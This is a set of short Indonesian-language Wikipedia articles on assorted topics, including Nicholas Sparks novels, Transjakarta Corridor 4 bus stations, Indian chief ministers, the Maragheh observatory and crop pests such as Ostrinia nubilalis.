<doc id="1757223" url="https://id.wikipedia.org/wiki?curid=1757223" title="Motohiro Hata">
Motohiro Hata




</doc>
<doc id="1757225" url="https://id.wikipedia.org/wiki?curid=1757225" title="Message in a Bottle (novel)">
Message in a Bottle (novel)

Message in a Bottle (terjemahan bahasa Indonesia: Pesan dalam Botol) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan April 1998 oleh penerbit Warner Books dan Grand Central Publishing di Amerika Serikat serta Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di Wilmington, Carolina Utara.

Terombang-ambing pada gelombang laut, dan pada nasib, botol bisa berakhir di mana saja. Sebaliknya, botol itu ditemukan hanya tiga minggu setelah memulai perjalanannya. Theresa Osborne, ibu dari anak dua belas tahun yang bercerai, menemukannya ketika ia berlibur dari pekerjaannya sebagai jurnalis surat kabar Boston, ke pantai. Di dalamnya ada surat yang berisi, "Catherine-ku Sayang, Aku merindukanmu sayangku, seperti yang selalu kulakukan, tetapi hari ini sangat sulit karena laut telah bernyanyi untukku, dan lagu adalah bahwa kehidupan kita bersama-sama..." Bagi Garret, pesan adalah satu-satunya cara ia memahami ekspresi cinta abadinya saat kehilangan wanita yang ia cintai. Bagi Theresa, keberhati-hatian terhadap asmara sejak suaminya menghilangkan kepercayaannya, pesan itu menimbulkan pertanyaan intrik. Tertantang oleh misteri, dan didorong untuk menemukan Garret dengan emosi yang tidak dapat dipahami, Theresa memulai pencarian yang membawanya ke sebuah kota pantai yang diterangi matahari dan konfrontasi tak terduga. Baik secara kebetulan atau sesuatu yang lebih kuat, kehidupan Theresa dan Garrett datang bersama-sama dalam sebuah kisah yang beresonansi dengan harapan terdalam untuk menemukan cinta abadi. Terpancar dengan ketegangan dan intensitas emosional, "Message in a Bottle" membawa pembaca untuk mencari kebenaran tentang seorang pria dan kenangan, serta kedua kerapuhan memilukan dan kekuatan besar cinta. Bagi yang menginginkan novel "The Notebook" dan menunggu menemukan keajaiban cerita Nicholas Sparks ini, novel ini adalah novel yang indah dan pedih pada kebetulan, keinginan, dan pilihan yang paling penting.


Film adaptasi dari novel "Message in a Bottle" dirilis pada tanggal 12 Februari 1999 di Amerika Serikat. Film ini disutradarai oleh Luis Mandoki dan diproduseri oleh Kevin Costner, Denise Di Novi, dan Jim Wilson. Naskah dari film ini ditulis oleh Gerald Di Pego. Film ini dibintangi oleh Kevin Costner sebagai Garret Blake, Robin Wright sebagai Theresa Osborne, dan Paul Newman sebagai Dodge Blake (ayah Garret, namun di dalam novel, ayah Garret bernama Jeb Blake).



</doc>
<doc id="1757233" url="https://id.wikipedia.org/wiki?curid=1757233" title="Wasabi Mizuta">
Wasabi Mizuta




</doc>
<doc id="1757234" url="https://id.wikipedia.org/wiki?curid=1757234" title="Rumah Sakit Umum Serawak">
Rumah Sakit Umum Serawak

Rumah Sakit Umum Serawak (bahasa Melayu:"Hospital Umum Sarawak") adalah rumah sakit terbesar di negara bagian Serawak, Malaysia. Tempat tersebut adalah rumah sakit tertiary dan referral utama di Malaysia Timur. Pada tahun-tahun awalnya, tempat tersebut dikenal sebagai Rumah Sakit Umum Kuching.



</doc>
<doc id="1757241" url="https://id.wikipedia.org/wiki?curid=1757241" title="ACES II">
ACES II

ACES II adalah sistem kursi ejeksi lontar diproduksi oleh United Technologies Aerospace Systems (UTAS) divisi dari United Technologies Corporation (UTC). ACES adalah singkatan dari Advanced Concept Ejection Seat.

Alat ini digunakan dalam pesawat A-10 Thunderbolt II, F-15 Eagle, General Dynamics F-16 Fighting Falcon, Lockheed Martin F-22 Raptor, F-117 Nighthawk, Rockwell B-1 Lancer, WB-57, dan Northrop Grumman B-2 Spirit. Lebih dari 10.000 kursi ACES II telah diproduksi dengan lebih dari 5.000 aktif ke seluruh dunia pada 2013.



</doc>
<doc id="1757242" url="https://id.wikipedia.org/wiki?curid=1757242" title="Pasar Pulo Gadung (Transjakarta)">
Pasar Pulo Gadung (Transjakarta)

Pasar Pulo Gadung adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Bekasi Raya, Rawa Terate, Cakung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama pasar yang berada di dekatnya, yaitu Pasar Pulo Gadung.



</doc>
<doc id="1757245" url="https://id.wikipedia.org/wiki?curid=1757245" title="TU Gas (Transjakarta)">
TU Gas (Transjakarta)

TU Gas adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Jatinegara Kaum, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama daerah tersebut.



</doc>
<doc id="1757247" url="https://id.wikipedia.org/wiki?curid=1757247" title="Layur (Transjakarta)">
Layur (Transjakarta)

Layur adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Jati, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama kampung yang berada di dekatnya, yaitu Kampung Layur.



</doc>
<doc id="1757248" url="https://id.wikipedia.org/wiki?curid=1757248" title="Velodrome (Transjakarta)">
Velodrome (Transjakarta)

Velodrome adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Rawamangun, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama arena balap sepeda yang berada di dekatnya, yaitu Jakarta International Velodrome.



</doc>
<doc id="1757249" url="https://id.wikipedia.org/wiki?curid=1757249" title="Pemuda Rawamangun (Transjakarta)">
Pemuda Rawamangun (Transjakarta)

Pemuda Rawamangun adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Jati, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama daerah tersebut.



</doc>
<doc id="1757250" url="https://id.wikipedia.org/wiki?curid=1757250" title="Sunan Giri (Transjakarta)">
Sunan Giri (Transjakarta)

Sunan Giri adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Rawamangun, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama jalan yang berada di dekatnya, yaitu Jalan Sunan Giri.



</doc>
<doc id="1757251" url="https://id.wikipedia.org/wiki?curid=1757251" title="UNJ (Transjakarta)">
UNJ (Transjakarta)

UNJ adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pemuda, Rawamangun, Pulo Gadung, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Stasiun BRT ini berdekatan dengan Universitas Negeri Jakarta. Nama stasiun BRT ini berasal dari nama universitas yang berada di dekatnya, yaitu Universitas Negeri Jakarta.



</doc>
<doc id="1757253" url="https://id.wikipedia.org/wiki?curid=1757253" title="Pramuka BPKP (Transjakarta)">
Pramuka BPKP (Transjakarta)

Pramuka BPKP adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pramuka, Rawasari, Cempaka Putih, Jakarta Pusat. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Stasiun BRT ini menyediakan transfer ke Koridor 10 melalui stasiun BRT Pemuda Pramuka. Nama stasiun BRT ini berasal dari nama daerah tersebut.




</doc>
<doc id="1757254" url="https://id.wikipedia.org/wiki?curid=1757254" title="Pramuka LIA (Transjakarta)">
Pramuka LIA (Transjakarta)

Pramuka LIA adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pramuka, Utan Kayu Utara, Matraman, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama gedung yang berada di dekatnya, yaitu Gedung Yayasan LIA.



</doc>
<doc id="1757255" url="https://id.wikipedia.org/wiki?curid=1757255" title="Utan Kayu (Transjakarta)">
Utan Kayu (Transjakarta)

Utan Kayu adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pramuka, Utan Kayu Utara, Matraman, Jakarta Timur. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama daerah tersebut.



</doc>
<doc id="1757257" url="https://id.wikipedia.org/wiki?curid=1757257" title="Pasar Genjing (Transjakarta)">
Pasar Genjing (Transjakarta)

Pasar Genjing atau Pasar Genjing-RSIA Evasari adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pramuka, Rawasari, Cempaka Putih, Jakarta Pusat. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama pasar yang berada di dekatnya, yaitu Pasar Genjing (juga disebut Pasar Burung).



</doc>
<doc id="1757258" url="https://id.wikipedia.org/wiki?curid=1757258" title="Manggarai (Transjakarta)">
Manggarai (Transjakarta)

Manggarai adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Sultan Agung, Pasar Manggis, Setiabudi, Jakarta Selatan. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Stasiun BRT ini berdekatan dengan Stasiun Manggarai. Nama stasiun BRT ini berasal dari nama daerah tersebut.



</doc>
<doc id="1757260" url="https://id.wikipedia.org/wiki?curid=1757260" title="Pasar Rumput (Transjakarta)">
Pasar Rumput (Transjakarta)

Pasar Rumput adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Sultan Agung, Pasar Manggis, Setiabudi, Jakarta Selatan. Stasiun BRT ini berada di Koridor 4 yang membentang dari barat ke timur. Nama stasiun BRT ini berasal dari nama pasar yang berada di dekatnya, yaitu Pasar Rumput.



</doc>
<doc id="1757263" url="https://id.wikipedia.org/wiki?curid=1757263" title="Balai Besar Kerajinan dan Batik">
Balai Besar Kerajinan dan Batik

Balai Besar Kerajinan dan Batik (BBKB) merupakan unit pelaksana teknis Kementerian Perindustrian Republik Indonesia yang memiliki tugas melaksanakan kegiatan penelitian, pengembangan, kerjasama, standardisasi, pengujian, sertifikasi, kalibrasi dan pengembangan kompetensi industri kerajinan dan batik yang ditetapkan oleh Kepala Badan Penelitian dan Pengembangan Industri, Kementerian Perindustrian RI. Balai Besar Kerajinan dan Batik berada di Yogyakarta. Balai Besar Kerajinan dan Batik dikenal sebagai salah satu lembaga di dunia yang menangani penelitian di bidang batik.

Pada awalnya lembaga ini didirikan pada tahun 1922 dengan nama TEXTILE INRICHTING EN BATIK PROEFSTATION dengan tujuan untuk memberikan informasi kepada perajin batik dan tekstil, yang perkembangannya kemudian lebih dikenal dengan nama Balai Penyelidikan Batik. Pada perkembangannya karena tuntutan ruang lingkup yang lebih luas maka dikembangkan menjadi Balai Penelitian Batik dan Kerajinan.

Menghadapi tugas yang semakin luas, maka pada tahun 1980 Balai Penelitian Batik dan Kerajinan berubah menjadi Balai Besar Penelitian dan Pengembangan Industri Kerajinan dan Batik.

Pada tahun 2002 dalam rangka menyesuaikan misi organisasi dengan kebutuhan nyata masyarakat industri dan perdagangan maka Balai Besar Penelitian dan Pengembangan Industri Kerajinan dan Batik di reorganisasi lagi menjadi Balai Besar Kerajinan dan Batik.

BBKB mempunyai tugas melaksanakan kegiatan penelitian, pengembangan, kerjasama, standardisasi, pengujian, sertifikasi, kalibrasi dan pengembangan kompetensi industri kerajinan dan batik sesuai kebijakan teknis yang ditetapkan oleh Kepala Badan Pengkajian Kebijakan Iklim dan Mutu Industri.


Balai Besar Kerajinan dan Batik memberikan layanan jasa kepada masyarakat industri kerajinan dan batik dalam bentuk:



</doc>
<doc id="1757271" url="https://id.wikipedia.org/wiki?curid=1757271" title="Mancakrida">
Mancakrida

Mancakrida () adalah bentuk pembelajaran perilaku kepemimpinan dan manajemen di alam terbuka dengan pendekatan yang unik dan sederhana tetapi efektif karena pelatihan ini tidak sarat dengan teori-teori melainkan langsung diterapkan pada elemen-elemen yang mendasar yang bersifat sehari-hari, seperti saling percaya, saling memperhatikan serta sikap proaktif dan komunikatif. Dimensi alam sebagai objek pendidikan bisa menjadi laboratorium sesungguhnya dan tempat bermain yang mengasyikan dengan berbagai metodenya.

Mancakrida dibentuk dengan memanfaatkan unsur "manca" yang bermakna "asing" atau "luar". Kemudian kata itu digabungkan dengan kata "krida" yang bermakna "olah", "perbuatan", "tindakan", atau "olahraga".

Istilah "outbound" berasal dari kata "Outward" dan "Bound".

Ide pendidikan inovatif ini dikreasikan oleh Kurt Hahn, seseorang berkebangsaan Jerman.

1.Mengetahui dan memahami adanya “individual differences” yaitu tiap individu adalah unik.

2.Mampu melakukan penilaian pada diri sendiri “Self Assessment” bahwa kekuatan diri ada pada tangan kita sendiri dan pada pilihan- pilihan kita.

3.Meningkatkan kepekaan “Self Awareness” terhadap orang lain.

4.Meningkatkan kepercayaan diri dan keberanian mengambil risiko “Risk Taking Behavior”.

5.Meningkatkan ketrampilan komunikasi.

6.Mampu membuat perencanaan dengan pertimbangan risiko dan konsekuensinya.

7.Mampu membentuk tim yang efektif / kekompakan.

8.Meningkatkankemampuan kepemimpinan.

9.Menumbuhkan sikap ksatria dan sportif.

1.Program Pelatihan Eksekutif (Eksecutive Training Program)
Program Pelatihan Eksekutif dirancang sebagai media untuk mengenal kemampuan diri (analisis internal), mengenal kondisi luar (analisis eksternal), menyusun berbagai strategi, mengkomunikasikannya dan mengimplementasikannya.

2.Program Pelatihan Staff Administrasi (Administratif Staff Program)
Program Pelatihan Staff Administrasi (Administratif Staff Program) dirancang sebagai media untuk mengenal kemampuan diri, dan kondisi lingkungan, serta sebagai media untuk mengembangkan kerjasama dan kualitas kinerja.

3.Program Pelatihan Profesi (Profesion Training Program)
Program Pelatihan Profesi (Profesion Training Program) dirancang sebagai media untuk mengenal kemampuan diri dan kondisi lingkungan, menyusun langkah kerja (strategi), melatih melakukan terobosan (inovasi), serta mengembangkan profesionalisme.

4.Pogram Pelatihan Pemuda/ Pendidikan/ Organisasi (Youth/ Education/ Organitation Planning Program)
Pogram Pelatihan ini dirancang dengan memanfaatkan berbagai tantangan dan petualangan yang menarik sebagai media untuk mengenal kemampuan diri (analisis internal), memformulasikan dan mengimplementasikan strategi, serta melakukan berbagai terobosan (inovasi) dan meningkatkan kemampuan bekerja dalam tim.

1.Team Building Goal
Program ini menunjukakan bahwa kerjasama adalah suatu hal yang mutlak diperlukan dalam pencapaian tujuan. Berbagai permasalahan akan dihadapi oleh peserta dimana mereka tidak mungkin menghadapinya sendiri. Saling tergantung, kerjasama, pentingnya komunikasi dan membangun suatu tim yang kompak adalah tujuan dari pelatihan ini.

2.Leadership Goal
Program pelatihan ini mengasah jiwa kepemimpinan yang terdapat pada diri peserta.Permasalahan-permasalahan yang ada perlu dihadapi oleh peserta dengan pengambilan keputusan yang berkualitas. Kepercayaan diri, kemampuan untuk memimpin kelompok, kemandirian dan kemampuan untuk mengayomi dari para peserta akan digali dan dipelajari sebagai suatu bekal dalam kepemimpinan mereka di kehidupan sehari – hari.

3.Outbound Training & Tamasya
Pelatihan ini akan banyak mempergunakan alam bebas (out door) sebagai medianya. Para peserta akan mempelajari semua materi dari kegiatan atau games yang akan diadakan di alam terbuka. Program ini akandilakukan dengan komposisi 70% di alam terbuka dan 30% diskusi kelompok (group discussion) sebagai penunjang dari setiap kegiatan.

4.Fun Game
Fun Game merupakan permainan yang menekankan unsur-unsur koordinasi, konsentrasi dan kebersamaan.

1.Ice Breaking (Mencairkan Suasana)
Memecahkan suasana yang kaku, dalam session ini para peserta diharapkan lebih mengenal antara peserta yang satu dengan yang lainnya.

2.Communication (Komunikasi)
Peserta akan dikoordinasikan dalam situasi permainan-permainan yang menarik, tidak membosankan. Berkomunikasi dapat membangkitkan rasa percaya terhadap rekan dan kelompoknya.

3.Team Build Jenis permainan yang bersifat menghibur juga mengajarkan kepada peserta mengenai berbagai pengetahuan yang hanya bisa diperoleh melalui pengalaman (experience) sendiri, serta wawasan peserta akan terasa dan bertambah kaya.

</doc>
<doc id="1757283" url="https://id.wikipedia.org/wiki?curid=1757283" title="Semenggoh Wildlife Rehabilitation Center">
Semenggoh Wildlife Rehabilitation Center

Semenggoh Wildlife Rehabilitation Center () adalah sebuah pusat rehabilitasi dan peliaran kembali orangutan, yang terletak di Semenggoh, 24 km di sebelah selatan Kuching, ibu kota Serawak, Malaysia. Setidaknya terdapat 27 ekor orangutan setengah liar yang dipelihara di sana, yang waktu pemberian makannya adalah jam 9 pagi dan 3 sore. Untuk melihat-lihat keindahan hutan, terdapat dua jalur lintas tinjau alam, yaitu "Masing Trail" dan "Brook's Pool Trail". Pemandu dapat disewa untuk para wisatawan. Pusat rehabilitasi ini dapat dicapai dengan bis atau taksi.


</doc>
<doc id="1757284" url="https://id.wikipedia.org/wiki?curid=1757284" title="Shenden">
Shenden

Shenden atau disebut juga Senden adalah sebuah tempat wisata yang berupa sungai kecil dengan air terjun kecil serta alam yang masih cukup asri dan alami. Shenden terletak di Kabupaten Jepara tepatnya di Kelurahan Mulyoharjo.

Shenden terletak dekat dengan pusat kota Jepara sebab tempat ini terdapat di daerah Kelurahan Mulyoharjo Kecamatan Jepara Kabupaten Jepara.

Shenden merupakan sebuah tempat untuk berwisata yang terdapat di Desa Mulyoharjo, Kecamatan Jepara, Kabupaten Jepara. Ketika kita kesana akan dimanjakan pemandangan yang asri meskipun tempatnya terdapat di daerah kota. Shenden terdapat banyak pepohonan besar, grojogan, dan sungai yang airnya sangat bersih.

Banyak pengunjung yang berwisata ke Shenden biasanya mereka mandi dan berenang, juga ada yang hanya berfoto-foto, ada juga yang hanya menikmati suasana sambil berpiknik bersama pacar, teman, ataupun keluarga. Gemricik air dan kicauan burung menjadikan Shenden sangat menenangkan hati bagi para pengunjung.

Sungai dengan aliran air berundak itu berada di tengah-tengah perkebunan warga. Dari pemukiman warga menuju Shenden harus ditempuh dengan jalan kaki sejauh 200 meter. Jika dibandingkan dengan sungai-sungai pada umumnya di Kabupaten Jepara, Sungai Shenden menawarkan panorama alam yang indah.

Shenden lebih banyak pengunjung pada musim kemarau dibanding pada musim penghujan. Karena ketika musim penghujan apabila mau mandi di sungai Shenden harus bisa menguasai tehnik berenang, kalau tidak bisa berenang maka tenggelam, sebab di musim penghujan sungai Shenden mencapai kedalaman 2,5 meter. Karenanya, pengunjung banyak mendatangi Sungai Shenden ketika musim kemarau karena kedalaman sungai di bawah 1 meter, sehingga aman bagi pengunjung yang tidak bisa berenang untuk merasakan mandi di sungai Shenden.

Pada musim penghujan pernah ada seorang mahasiswa tenggelam di sungai Shenden, dikarenakan tidak bisa berenang. Sebab di musim penghujan kedalaman sungai Shenden mencapai 2,5 meter. Karenanya, Shenden didatangi banyak pengunjung pada musim kemarau, selain karena lebih aman sebab airnya tidak dalam dan tidak terdapat arus sungai yang deras, juga untuk menyegarkan diri di musim kemarau yang panas.

Kepala Desa Mulyoharjo memiliki berencana mengalokasikan 20% dana desa (BUMDes) untuk membangun wisata di Desa Mulyoharjo, yaitu mengembangkan "Sungai Shenden" menjadi objek wisata, dengan cara menambah fasilitas yang dapat menjadi daya tarik untuk berkunjung ke Shenden, ialah:


</doc>
<doc id="1757287" url="https://id.wikipedia.org/wiki?curid=1757287" title="Jalur Daxing, Beijing Subway">
Jalur Daxing, Beijing Subway

Jalur Daxing Beijing Subway () adalah jalur angkutan cepat yang menghubungkan bagian selatan Distrik Daxing dengan jaringan subway. Merupakan perpanjangan dari Jalur 4 di ujung selatan di Majialou, ke Nanzhao Lu di Distrik Daxing. Jalur Daxing memiliki panjang rute 21.7 km dengan 18 km berada dibawah tanah. Dari 12 stasiun, hanya Xihongmen yang terletak melayang. Konstruksi dimulai tahun 2007 dan resmi dibuka 30 Desember 2010.

a. Termasuk perjalanan jalur 4. 
b. "Lihat" (Chinese) & (English)


</doc>
<doc id="1757289" url="https://id.wikipedia.org/wiki?curid=1757289" title="Pawan Kumar Chamling">
Pawan Kumar Chamling

Pawan Kumar Chamling (Gorkhali: ) (kelahiran 22 September 1950) adalah ketua menteri negara bagian India Sikkim kelima dan petahana. Chamling adalah presiden pendiri Front Demokratik Sikkim, yang memerintah negara bagian tersebut untuk lima masa jabatan suksesif sejak 1994. Ia adalah Ketua Menteri India paling lama menjabat yang telah memenangkan pemilihan mahkamah legislatif untuk 5 masa jabatan dan akan menyelesaikan 25 tahun masa jabatan pada pemilihan legislatif berikutnya, (2019) membuat sebuah sejarah politik di India.

Chamling lahir di Yangang, Sikkim Selatan dari pasangan Ashbahadur Chamling dan Asharani Chamling. Chamling juga merupakan seorang penulis berbahasa Nepal dan penerima penghargaan "Bhanu Puraskar" (2010) yang diberikan oleh Sikkim Sahitya Parishad. Ia menulis dibawa nama pena Pawan Chamling "Kiran".

Chamling terpilih sebagai presiden Yangang Gram Panchayat pada 1982. Pada 1985, ia terpilih pada Mahkamah Legislatif Sikkim untuk pertama kalinya. Setelah terpilih untuk kedua kalinya dari konstituensi Damthang, ia menjadi Menteri Industri, Informasi dan Hubungan Publik dari 1989 sampai 1992 dalam kabinet Nar Bahadur Bhandari. Setelah serangkaian gejolak politik yang besar di Sikkim, Chamling membentuk Front Demokratik Sikkim pada 4 Maret 1993.

Chamling adalah satu-satunya ketua menteri India yang memerintah sebuah negara bagian sebanyak empat kali, dengan partainya Front Demokratik Sikkim yang memenangkan pemilihan mahkamah legislatif Sikkim 1994, 1999, 2004, 2009 dan 2014. Partainya pertama kali berkuasa di Sikkim setelah memenangkan pemilihan mahkamah 1994. Keterkenalannya terjadi di Sikkim karena karya pengembangannya dan perdamaian yang diutamakan. Pada 2009, partainya FDS memenangkan seluruh 32 kursi mahkamah di Mahkamah Legislatif Sikkim.

Setelah menang dalam pemilihan mahkamah 2014, ia dilantik sebagai Ketua Menteri Sikkim untuk masa jabatan kelima pada 21 Mei 2014 oleh Shriniwas Dadasaheb Patil, Gubernur Sikkim. Ia menjadi ketua menteri dengan masa jabatan kelima, sebuah rekor yang sebelumnya dipegang oleh Jyoti Basu yang memerintah Bengal Barat dari 1977 sampai 2000.




</doc>
<doc id="1757292" url="https://id.wikipedia.org/wiki?curid=1757292" title="Daftar Ketua Menteri Tripura">
Daftar Ketua Menteri Tripura

Ketua Menteri Tripura adalah ketua eksekutif dari negara bagian timur laut India Tripura. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Tripura, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1963, Tripura telah memiliki sembilan ketua menteri. Yang pertama adalah Sachindra Lal Singh dari Kongres Nasional India. Manik Sarkar dari Partai Komunis India (Marxis) telah menjabat sebagai Ketua Menteri Tripura sejak 1998; masa jabatannya adalah masa jabatan terlama dalam sejarah negara bagian tersebut.



</doc>
<doc id="1757293" url="https://id.wikipedia.org/wiki?curid=1757293" title="Nights in Rodanthe (novel)">
Nights in Rodanthe (novel)

Nights in Rodanthe (terjemahan bahasa Indonesia: Malam-Malam di Rodanthe) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan September 2002 oleh penerbit Warner Books dan Grand Central Publishing di Amerika Serikat serta Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di Rodanthe, Carolina Utara.

Kisah yang menyentuh hati, tentang harapan, sukacita, dan memaafkan, dan bahwa cinta bisa datang setiap saat, tak mengenal waktu dan usia, sering kali justru pada saat tidak diharapkan. Pada usia 45 tahun, Adrienne Willis mulai menata kembali hidupnya setelah suaminya meninggalkannya untuk wanita yang lebih muda. Masih dengan kesedihan mendalam, ia menerima tawaran seorang teman untuk menjaga penginapan di Rodanthe, kota pantai kecil di Carolina Utara. Ketika badai besar mengarah ke kota itu, tampaknya Adrienne akan terisolasi di sana, namun ternyata ada seorang tamu yang datang, Paul Flanner. Paul, dokter berusia 54 tahun, telah menjual praktiknya dan datang ke Rodanthe untuk berdamai dengan dirinya dan masa lalunya. Dua orang yang sama-sama "terluka" ini menemukan penghiburan satu sama lain, dan kebersamaan pada satu akhir minggu itu mengubah banyak hal dalam hidup mereka.


Film adaptasi dari novel "Nights in Rodanthe" dirilis pada tanggal 26 September 2008 di Amerika Serikat. Film ini disutradarai oleh George C. Wolfe dan diproduseri oleh Denise DiNovi. Naskah dari film ini ditulis oleh Ann Peacock dan John Romano. Film ini dibintangi oleh Diane Lane sebagai Adrienne Willis, Richard Gere sebagai Dr. Paul Flanner, dan James Franco sebagai Dr. Mark Flanner (putra Dr. Paul).



</doc>
<doc id="1757297" url="https://id.wikipedia.org/wiki?curid=1757297" title="Munisipalitas Padawan">
Munisipalitas Padawan

Munisipalitas Padawan adalah sebuah nama kolektid yang diberikan untuk sebuah subset dari wilayah Distrik Kuching yang tidak diadministrasikan secara lokal oleh Dewan Kota Kuching Selatan dan Dewan Kota Kuching Utara. Tempat tersebut memiliki wilayah seluas 1,431.82 km, yang meliputi subperkotaan dari subdistrik Proper Kuching dan seluruh wilayah subdistrik Siburan dan Padawan. Wilayah tersebut sekarang diadministrasikan oleh Dewan Munisipal Padawan.




</doc>
<doc id="1757299" url="https://id.wikipedia.org/wiki?curid=1757299" title="Observatorium Maragheh">
Observatorium Maragheh

Observatorium Maragheh (), adalah sebuah observatorium astronomi yang diinstitutionalisasikan yang didirikan pada 1259 Masehi dibawah perlindungan Ilkhanid Hulagu dan kedirekturan Nasir al-Din al-Tusi, seorang ilmuwan dan astronom Persia. Terletak di dataran tinggi di barat Maragheh, Provinsi Azerbaijan Timur, Iran, tempat tersebut sempat dianggap menjadi observatorium paling prestisius di dunia.

Observatorium tersebut dijadikan sebagai sebuah model untuk observatorium-observatorium berikutnya yang meliputi Observatorium Ulugh Beg abad ke-15 di Samarkand, Observatorium Taqi al-Din abad ke-16 di Istanbul, dan Observatorium Jai Singh abad ke-18 di Jaipur.

"Revolusi Maragha" merujuk kepada revolusi aliran Maragheh melawan astronomi Ptolemaik. "Aliran Maragha" adalah sebuah tradisi astronomi yang bermula di observatorium Maragheh dan dilanjutkan dengan astronom-astronom daru masjid Damaskus dan Observatorium Samarkand. Astronom-astronom Maragha paling berpengaruh meliputi Mo'ayyeduddin Urdi (m. 1266), Nasīr al-Dīn al-Tūsī (1201–1274), Najm al-Dīn al-Qazwīnī al-Kātibī (m. 1277), Qutb al-Din al-Shirazi (1236–1311), Sadr al-Sharia al-Bukhari (s. 1347), Ibn al-Shatir (1304–1375), Ali Qushji (s. 1474), al-Birjandi (m. 1525), dan Shams al-Din al-Khafri (m. 1550).




</doc>
<doc id="1757302" url="https://id.wikipedia.org/wiki?curid=1757302" title="Ostrinia nubilalis">
Ostrinia nubilalis

Ostrinia nubilalis adalah salah satu hama utama pertanaman jagung yang menyerang bagian batang maupun pangkal tongkolnya. Larvanya membuat saluran-saluran di dalam batang selagi menggerogoti jaringan untuk makanannya, sehingga ia disebut juga penggerek batang jagung atau European corn borer. Penyebutan "europa" digunakan untuk membedakannya dari penggerek batang jagung di kawasan beriklim tropika, "Asian corn borer" ("O. furnacalis").

Serangga ini termasuk dalam kelompok ngengat dan anggota suku Crambidae, yang memang dikenal menyukai anggota rumput-rumputan.


</doc>
<doc id="1757304" url="https://id.wikipedia.org/wiki?curid=1757304" title="Tantrasangraha">
Tantrasangraha

Tantrasamgraha (juga ditransliterasikan sebagai Tantrasangraha) adalah sebuah penulisan astronomi berpengaruh yang ditulis oleh Nilakantha Somayaji, seorang astronom/matematikawan yang berasal dari aliran astronomi dan matematika Kerala.
Penulisan tersebut diselesaikan pada 1501 Masehi. Penulisan tersebut terdiri dari 432 ayat dalam bahasa Sansekerta yang dibagi dalam delapan bab.



</doc>
<doc id="1757307" url="https://id.wikipedia.org/wiki?curid=1757307" title="Atherigona">
Atherigona

Atherigona atau lalat bibit adalah sekelompok lalat kecil yang memiliki sekitar 220 spesies dan sebagian anggotanya merupakan hama penting dan merusak pada pertanaman, terutama pada serealia.

Lalat bibit bertelur pada bagian pangkal daun muda tumbuhan rumput-rumputan, dan larvanya memakan pangkal daun serta titik tumbuh yang lunak. Serangan ini berakibat fatal pada tanaman yang tidak mampu membentuk anakan ("tiller") dan praktis tanaman akan mati. Lalat bibit terutama menjadi hama penting pada pertanaman jagung dan sorgum.


</doc>
<doc id="1757308" url="https://id.wikipedia.org/wiki?curid=1757308" title="Dear John (novel)">
Dear John (novel)

Dear John adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan Oktober 2006 oleh penerbit Warner Books dan Grand Central Publishing di Amerika Serikat serta Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di Wilmington, Carolina Utara.

